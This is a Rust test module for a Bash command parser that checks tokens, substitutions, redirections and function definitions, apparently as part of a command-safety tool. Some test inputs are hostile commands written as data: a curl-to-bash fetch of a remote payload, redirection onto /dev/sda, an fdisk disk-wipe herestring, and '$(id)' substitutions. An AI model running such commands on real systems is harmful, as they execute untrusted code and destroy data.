    fn parse_command_extracts_bracket_test_command() {
        let artifact =
            parse_command("[ -f Cargo.toml ]", ShellKind::Bash).expect("expected parse to succeed");

        assert_eq!(artifact.status, ParseStatus::Complete);
        assert_eq!(artifact.commands.len(), 1);

        let command = &artifact.commands[0];
        assert_eq!(command.command_name.as_deref(), Some("["));
        assert_eq!(command.tokens.len(), 3);
        assert_eq!(command.tokens[0].text, "-f");
        assert_eq!(command.tokens[0].kind, CommandTokenKind::Arg);
        assert_eq!(command.tokens[1].text, "Cargo.toml");
        assert_eq!(command.tokens[1].kind, CommandTokenKind::Arg);
        assert_eq!(command.tokens[2].text, "]");
        assert_eq!(command.tokens[2].kind, CommandTokenKind::Arg);
    }

    #[test]
    fn parse_command_extracts_unquoted_dynamic_tokens() {
        let artifact = parse_command(r#"bash $script $(pwd) <(echo ok)"#, ShellKind::Bash)
            .expect("expected parse to succeed");

        assert_eq!(artifact.commands.len(), 1);
        let command = &artifact.commands[0];
        assert_eq!(command.command_name.as_deref(), Some("bash"));
        assert_eq!(command.tokens.len(), 3);
        assert_eq!(command.tokens[0].text, "$script");
        assert_eq!(command.tokens[0].node_kind, "simple_expansion");
        assert!(!command.tokens[0].quoted);
        assert_eq!(command.tokens[1].text, "$(pwd)");
        assert_eq!(command.tokens[1].node_kind, "command_substitution");
        assert_eq!(command.tokens[1].command_substitutions.len(), 1);
        assert_eq!(command.tokens[1].command_substitutions[0].body_text, "pwd");
        assert_eq!(command.tokens[2].text, "<(echo ok)");
        assert_eq!(command.tokens[2].node_kind, "process_substitution");
    }

    #[test]
    fn parse_command_substitution_facts_respect_single_vs_double_quotes() {
        let artifact = parse_command(r#"echo '$(id)' "$(whoami)""#, ShellKind::Bash)
            .expect("expected parse to succeed");

        let command = &artifact.commands[0];
        assert_eq!(command.tokens.len(), 2);
        assert_eq!(command.tokens[0].text, "$(id)");
        assert!(command.tokens[0].quoted);
        assert!(command.tokens[0].command_substitutions.is_empty());
        assert_eq!(command.tokens[1].text, "$(whoami)");
        assert!(command.tokens[1].quoted);
        assert_eq!(command.tokens[1].command_substitutions.len(), 1);
        assert_eq!(command.tokens[1].command_substitutions[0].text, "$(whoami)");
        assert_eq!(
            command.tokens[1].command_substitutions[0].body_text,
            "whoami"
        );
    }

    #[test]
    fn parse_assignment_command_substitution_facts_respect_single_vs_double_quotes() {
        let literal = parse_command(r#"PAYLOAD='$(id)'"#, ShellKind::Bash)
            .expect("expected parse to succeed");
        let literal_assignment = &literal.assignment_commands[0].assignments[0];
        assert_eq!(literal_assignment.value.text, "$(id)");
        assert!(literal_assignment.value.quoted);
        assert!(literal_assignment.value.command_substitutions.is_empty());

        let expanded = parse_command(r#"PAYLOAD="$(whoami)""#, ShellKind::Bash)
            .expect("expected parse to succeed");
        let expanded_assignment = &expanded.assignment_commands[0].assignments[0];
        assert_eq!(expanded_assignment.value.text, "$(whoami)");
        assert!(expanded_assignment.value.quoted);
        assert_eq!(expanded_assignment.value.command_substitutions.len(), 1);
        assert_eq!(
            expanded_assignment.value.command_substitutions[0].body_text,
            "whoami"
        );
    }

    #[test]
    fn parse_command_substitution_facts_do_not_flatten_nested_bodies() {
        let artifact = parse_command(r#"echo "$(printf "$(id)")""#, ShellKind::Bash)
            .expect("expected parse to succeed");

        let token = &artifact.commands[0].tokens[0];
        assert_eq!(token.command_substitutions.len(), 1);
        assert_eq!(token.command_substitutions[0].text, r#"$(printf "$(id)")"#);
        assert_eq!(
            token.command_substitutions[0].body_text,
            r#"printf "$(id)""#
        );
    }

    #[test]
    fn parse_command_substitutions_extracts_inner_body_from_fragment() {
        let substitutions =
            parse_command_substitutions(r#"prefix $(cat ./payload.sh) suffix"#, ShellKind::Bash)
                .expect("expected substitution parse to succeed");

        assert_eq!(substitutions.len(), 1);
        assert_eq!(substitutions[0].text, "$(cat ./payload.sh)");
        assert_eq!(substitutions[0].body_text, "cat ./payload.sh");
    }

    #[test]
    fn parse_process_substitutions_extracts_direction_and_inner_body() {
        let substitutions =
            parse_process_substitutions(r#"diff <(cat a) >(tee out.log)"#, ShellKind::Bash)
                .expect("expected process substitution parse to succeed");

        assert_eq!(substitutions.len(), 2);
        assert_eq!(substitutions[0].text, "<(cat a)");
        assert_eq!(substitutions[0].body_text, "cat a");
        assert_eq!(
            substitutions[0].operator,
            ProcessSubstitutionOperator::Input
        );
        assert_eq!(substitutions[1].text, ">(tee out.log)");
        assert_eq!(substitutions[1].body_text, "tee out.log");
        assert_eq!(
            substitutions[1].operator,
            ProcessSubstitutionOperator::Output
        );
    }

    #[test]
    fn parse_command_excludes_commands_nested_in_command_substitution() {
        let artifact = parse_command(
            r#"bash -c "$(curl https://example.test/payload.sh)""#,
            ShellKind::Bash,
        )
        .expect("expected parse to succeed");

        assert_eq!(artifact.commands.len(), 1);
        assert_eq!(artifact.commands[0].command_name.as_deref(), Some("bash"));
    }

    #[test]
    fn parse_command_extracts_export_assignment_fact() {
        let artifact = parse_command(r#"export FOO="$BAR""#, ShellKind::Bash)
            .expect("expected parse to succeed");

        assert_eq!(artifact.commands.len(), 0);
        assert_eq!(artifact.declaration_commands.len(), 1);
        assert_eq!(artifact.unset_commands.len(), 0);

        let declaration = &artifact.declaration_commands[0];
        assert_eq!(declaration.kind, DeclarationCommandKind::Export);
        assert!(declaration.options.is_empty());
        assert!(declaration.names.is_empty());
        assert_eq!(declaration.assignments.len(), 1);

        let assignment = &declaration.assignments[0];
        assert_eq!(assignment.name, "FOO");
        assert_eq!(assignment.operator, AssignmentOperator::Assign);
        assert_eq!(assignment.value.text, "$BAR");
        assert!(assignment.value.quoted);
        assert_eq!(assignment.value.node_kind, "string");
    }

    #[test]
    fn parse_command_extracts_export_name_without_assignment() {
        let artifact =
            parse_command("export FOO", ShellKind::Bash).expect("expected parse to succeed");

        assert_eq!(artifact.declaration_commands.len(), 1);

        let declaration = &artifact.declaration_commands[0];
        assert_eq!(declaration.kind, DeclarationCommandKind::Export);
        assert!(declaration.options.is_empty());
        assert_eq!(declaration.names, vec!["FOO".to_string()]);
        assert!(declaration.assignments.is_empty());
    }

    #[test]
    fn parse_command_extracts_empty_assignment_value() {
        let artifact =
            parse_command("export FOO=", ShellKind::Bash).expect("expected parse to succeed");

        let declaration = &artifact.declaration_commands[0];
        let assignment = &declaration.assignments[0];

        assert_eq!(assignment.name, "FOO");
        assert_eq!(assignment.operator, AssignmentOperator::Assign);
        assert_eq!(assignment.value.text, "");
        assert_eq!(assignment.value.node_kind, "empty");
        assert!(!assignment.value.quoted);
    }

    #[test]
    fn parse_command_extracts_unset_fact_with_options() {
        let artifact =
            parse_command("unset -f FUNC VAR", ShellKind::Bash).expect("expected parse to succeed");

        assert_eq!(artifact.unset_commands.len(), 1);

        let unset = &artifact.unset_commands[0];
        assert_eq!(unset.options, vec!["-f".to_string()]);
        assert_eq!(unset.names, vec!["FUNC".to_string(), "VAR".to_string()]);
    }

    #[test]
    fn parse_command_extracts_function_definition_without_body_commands() {
        let artifact = parse_command(
            "deploy() { curl https://example.test/payload.sh | bash; }\ndeploy",
            ShellKind::Bash,
        )
        .expect("expected parse to succeed");

        assert_eq!(artifact.function_definitions.len(), 1);
        assert_eq!(artifact.function_definitions[0].name, "deploy");
        assert_eq!(
            artifact.function_definitions[0].body_text,
            "curl https://example.test/payload.sh | bash;"
        );
        assert_eq!(artifact.commands.len(), 1);
        assert_eq!(artifact.commands[0].command_name.as_deref(), Some("deploy"));
    }

    #[test]
    fn parse_command_tracks_pipeline_position_and_background_terminator() {
        let body = parse_command("a|b; c &", ShellKind::Bash)
            .expect("expected function body fragment to parse");
        assert_eq!(body.commands.len(), 3);

        assert_eq!(body.commands[0].command_name.as_deref(), Some("a"));
        assert_eq!(
            body.commands[0].pipeline_position,
            Some(PipelinePosition::First)
        );
        assert_eq!(body.commands[1].command_name.as_deref(), Some("b"));
        assert_eq!(
            body.commands[1].pipeline_position,
            Some(PipelinePosition::Last)
        );
        assert_eq!(
            body.commands[2].terminator,
            Some(StatementTerminator::Background)
        );
    }

    #[test]
    fn parse_command_marks_guarded_recursive_sites() {
        let body = parse_command("if cond; then f|f; fi", ShellKind::Bash)
            .expect("expected guarded fragment to parse");
        assert!(body.commands.iter().all(|command| command.guarded));
    }

    #[test]
    fn parse_command_extracts_function_keyword_definition() {
        let artifact = parse_command(
            "function deploy { bash ./scripts/build.sh; }",
            ShellKind::Bash,
        )
        .expect("expected parse to succeed");

        assert_eq!(artifact.function_definitions.len(), 1);
        assert_eq!(artifact.function_definitions[0].name, "deploy");
        assert_eq!(
            artifact.function_definitions[0].body_text,
            "bash ./scripts/build.sh;"
        );
        assert!(artifact.commands.is_empty());
    }

    #[test]
    fn parse_command_keeps_prefix_assignment_as_command_not_declaration() {
        let artifact =
            parse_command("FOO=bar ls", ShellKind::Bash).expect("expected parse to succeed");

        assert_eq!(artifact.commands.len(), 1);
        assert!(artifact.declaration_commands.is_empty());
        assert!(artifact.assignment_commands.is_empty());
        assert!(artifact.unset_commands.is_empty());
        assert_eq!(artifact.commands[0].command_name.as_deref(), Some("ls"));
        assert_eq!(artifact.commands[0].prefix_assignments.len(), 1);
        assert_eq!(artifact.commands[0].prefix_assignments[0].name, "FOO");
        assert_eq!(artifact.commands[0].prefix_assignments[0].value.text, "bar");
        assert!(artifact.commands[0].tokens.is_empty());
    }

    #[test]
    fn parse_command_extracts_plain_assignment_command() {
        let artifact = parse_command(
            r#"TMP_SCRIPT="$(mktemp /tmp/tmp.XXXXXX.sh)""#,
            ShellKind::Bash,
        )
        .expect("expected parse to succeed");

        assert!(artifact.commands.is_empty());
        assert!(artifact.declaration_commands.is_empty());
        assert_eq!(artifact.assignment_commands.len(), 1);

        let assignment_command = &artifact.assignment_commands[0];
        assert_eq!(assignment_command.assignments.len(), 1);

        let assignment = &assignment_command.assignments[0];
        assert_eq!(assignment.name, "TMP_SCRIPT");
        assert_eq!(assignment.operator, AssignmentOperator::Assign);
        assert_eq!(assignment.value.text, "$(mktemp /tmp/tmp.XXXXXX.sh)");
        assert!(assignment.value.quoted);
        assert_eq!(assignment.value.node_kind, "string");
    }

    #[test]
    fn parse_command_extracts_append_assignment_operator() {
        let artifact = parse_command(r#"PATH+=":$(pwd)""#, ShellKind::Bash)
            .expect("expected parse to succeed");

        assert_eq!(artifact.assignment_commands.len(), 1);

        let assignment = &artifact.assignment_commands[0].assignments[0];
        assert_eq!(assignment.name, "PATH");
        assert_eq!(assignment.operator, AssignmentOperator::Append);
        assert_eq!(assignment.value.text, ":$(pwd)");
        assert!(assignment.value.quoted);
    }

    #[test]
    fn parse_command_extracts_file_redirection() {
        let artifact =
            parse_command("echo hi > out.txt", ShellKind::Bash).expect("expected parse to succeed");

        assert_eq!(artifact.status, ParseStatus::Complete);
        assert_eq!(artifact.commands.len(), 1);
        assert_eq!(artifact.redirections.len(), 1);

        let redirection = &artifact.redirections[0];
        assert_eq!(redirection.kind, RedirectionKind::File);
        assert_eq!(redirection.operator.as_deref(), Some(">"));
        let target = redirection
            .target
            .as_ref()
            .expect("expected file redirection target");
        assert_eq!(target.text, "out.txt");
        assert!(!target.quoted);
        assert_eq!(target.node_kind, "word");
        assert_eq!(redirection.parent_command_name.as_deref(), Some("echo"));
        assert_eq!(
            redirection.parent_command_span,
            Some(artifact.commands[0].span.clone())
        );
    }

    #[test]
    fn parse_command_extracts_bare_file_redirection_without_command_fact() {
        let artifact =
            parse_command("> /dev/sda", ShellKind::Bash).expect("expected parse to succeed");

        assert_eq!(artifact.status, ParseStatus::Complete);
        assert!(artifact.commands.is_empty());
        assert_eq!(artifact.redirections.len(), 1);

        let redirection = &artifact.redirections[0];
        assert_eq!(redirection.kind, RedirectionKind::File);
        assert_eq!(redirection.operator.as_deref(), Some(">"));
        let target = redirection
            .target
            .as_ref()
            .expect("expected file redirection target");
        assert_eq!(target.text, "/dev/sda");
        assert_eq!(redirection.parent_command_name, None);
        assert_eq!(redirection.parent_command_span, None);
    }

    #[test]
    fn parse_command_extracts_herestring_redirection() {
        let artifact = parse_command(r#"bash <<< "echo ok""#, ShellKind::Bash)
            .expect("expected parse to succeed");

        assert_eq!(artifact.redirections.len(), 1);

        let redirection = &artifact.redirections[0];
        assert_eq!(redirection.kind, RedirectionKind::HereString);
        assert_eq!(redirection.operator.as_deref(), Some("<<<"));
        let content = redirection
            .content
            .as_ref()
            .expect("expected herestring content");
        assert_eq!(content.text, "echo ok");
        assert!(content.quoted);
        assert_eq!(redirection.parent_command_name.as_deref(), Some("bash"));
        assert_eq!(
            redirection.parent_command_span,
            Some(artifact.commands[0].span.clone())
        );
    }

    #[test]
    fn parse_command_extracts_ansi_c_herestring_redirection() {
        let artifact = parse_command(r#"fdisk /dev/sda <<<$'g\nw\n'"#, ShellKind::Bash)
            .expect("expected parse to succeed");

        assert_eq!(artifact.redirections.len(), 1);

        let redirection = &artifact.redirections[0];
        assert_eq!(redirection.kind, RedirectionKind::HereString);
        let content = redirection
            .content
            .as_ref()
            .expect("expected herestring content");
        assert_eq!(content.text, "g\nw\n");
        assert!(content.quoted);
        assert_eq!(content.node_kind, "ansi_c_string");
    }

    #[test]
    fn parse_command_extracts_heredoc_redirection() {
        let artifact = parse_command("bash <<'EOF'\necho ok\nEOF", ShellKind::Bash)
            .expect("expected parse to succeed");

        assert_eq!(artifact.redirections.len(), 1);

        let redirection = &artifact.redirections[0];
        assert_eq!(redirection.kind, RedirectionKind::HereDoc);
        assert_eq!(redirection.operator.as_deref(), Some("<<"));
        let content = redirection
            .content
            .as_ref()
            .expect("expected heredoc content");
        assert_eq!(content.text, "echo ok\n");
        assert!(!content.quoted);
        assert_eq!(content.node_kind, "heredoc_body");
        assert_eq!(redirection.parent_command_name.as_deref(), Some("bash"));
        assert_eq!(
            redirection.parent_command_span,
            Some(artifact.commands[0].span.clone())
        );
    }

    #[test]
    fn parse_command_groups_commands_by_pipeline_span() {
        let artifact = parse_command("cat a | bash; echo ok | sh", ShellKind::Bash)
            .expect("expected parse to succeed");

        assert_eq!(artifact.commands.len(), 4);
        assert!(artifact.commands.iter().all(|command| command.in_pipeline));

        let first_pipeline = artifact.commands[0]
            .pipeline_span
            .as_ref()
            .expect("expected first command to have pipeline span");
        let second_pipeline = artifact.commands[2]
            .pipeline_span
            .as_ref()
            .expect("expected third command to have pipeline span");

        assert_eq!(
            artifact.commands[1].pipeline_span.as_ref(),
            Some(first_pipeline)
        );
        assert_eq!(
            artifact.commands[3].pipeline_span.as_ref(),
            Some(second_pipeline)
        );
        assert_ne!(first_pipeline, second_pipeline);
    }

    #[test]
    fn parse_command_uses_nested_pipeline_spans_for_left_associated_pipeline() {
        let artifact = parse_command(
            r#"find . -name "*.md" -o -name "*.txt" | xargs grep -l "site:\|inurl:\|intitle:\|filetype:" 2>/dev/null | head -10"#,
            ShellKind::Bash,
        )
        .expect("expected parse to succeed");

        assert_eq!(artifact.commands.len(), 3);
        assert!(artifact.commands.iter().all(|command| command.in_pipeline));
        assert!(
            artifact
                .commands
                .iter()
                .all(|command| command.pipeline_span.is_some())
        );
        assert_eq!(
            artifact.commands[0].pipeline_span.as_ref(),
            artifact.commands[1].pipeline_span.as_ref()
        );
        assert_ne!(
            artifact.commands[1].pipeline_span.as_ref(),
            artifact.commands[2].pipeline_span.as_ref()
        );
        assert_eq!(
            artifact.commands[0].top_level_span,
            artifact.commands[2].top_level_span
        );
    }

    #[test]
    fn parse_command_preserves_redirection_target_operand_metadata() {
        let artifact = parse_command(r#"echo hi > "$OUT""#, ShellKind::Bash)
            .expect("expected parse to succeed");

        let target = artifact.redirections[0]
            .target
            .as_ref()
            .expect("expected file redirection target");

        assert_eq!(target.text, "$OUT");
        assert!(target.quoted);
        assert_eq!(target.node_kind, "string");
    }

    #[test]
    fn parse_command_marks_partial_when_tree_contains_error_nodes() {
        let artifact = parse_command(r#"echo "unterminated"#, ShellKind::Bash)
            .expect("expected parse to return partial artifact");

        assert_eq!(artifact.status, ParseStatus::Partial);
        assert!(!artifact.diagnostics.is_empty());
    }

    #[test]
    fn parse_command_rejects_unsupported_shell_kinds() {
        let error = parse_command("Write-Host hello", ShellKind::Powershell)
            .expect_err("expected unsupported shell error");

        assert_eq!(error, ParseError::UnsupportedShell(ShellKind::Powershell));
    }
}
